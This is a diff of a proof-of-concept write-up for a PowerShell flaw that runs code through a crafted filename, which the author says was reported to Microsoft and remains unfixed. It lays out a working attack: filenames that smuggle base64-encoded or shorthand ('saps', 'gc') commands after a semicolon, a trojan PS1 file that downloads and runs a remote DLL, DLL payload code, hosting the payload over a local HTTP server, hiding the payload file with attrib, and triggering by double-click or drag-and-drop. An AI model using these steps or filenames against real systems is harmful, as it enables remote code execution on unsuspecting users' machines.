@@ -3,8 +3,7 @@ Windows PowerShell Filename Code Execution POC
 
 Dusted this off and improved it a bit: <br> 
 1) Execute a remote DLL using rundll32
-2) Execute an unintended PS script (for a short non base64 encoded filename)
-3) Execute a hidden text-file: Testing;saps (gc -) PoC.ps1  (Optional: attrib +s +h text-file)
+2) Execute an unintended secondary PS1 script or hidden text-file
 
 First reported to Microsoft back in 2019 yet remains unfixed as of the time of this writing. <br>  
 Remote code execution via a specially crafted filename. <br>  
@@ -13,9 +12,9 @@ The flaw is due to semicolon ";" we can decode a Base64 command and execute stra
 
 Test;POweRsHeLL -e [BASE64 PAYLOAD];.ps1 <br>  
 
-OR just call commands straight away! <br>  
+OR just call commands straight away <br>  
 
-Testing;saps (gc -) PoC.ps1
+"Testing;saps (gc -) PoC.ps1"
 
 Vectors: double click, drag and drop to PS shortcut
 Requirements: user must have the following setting to call a secondary script
@@ -23,7 +22,7 @@ Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
 
 Leverages alternate shorthand PS commands like "saps", "gc" start a process and get-content etc.
 
-Create a trojan PS1 file that will try to download and execute a remote DLL namec "1.d"
+DLL Execution: create a trojan PS1 file that will try to download and execute a remote DLL namec "1.d"
 
 Python: <br>  
 from base64 import b64encode
@@ -42,6 +41,18 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){
 evilo();
 return 0;
 }
+
+python -m http.server 80
+
+Double click the trojan PS1 file.
+
+Text-file named dash "-" Code Execution.
+Create a PS1 file with name including saps "start a process" and gc "get-content", this will read commands from hidden file.
+"Test;saps (gc -) PoC.ps1"
+Create hidden: attrib +s +h "-"
+Double click or drag and drop.
+
+
 
 Video PoC:
 
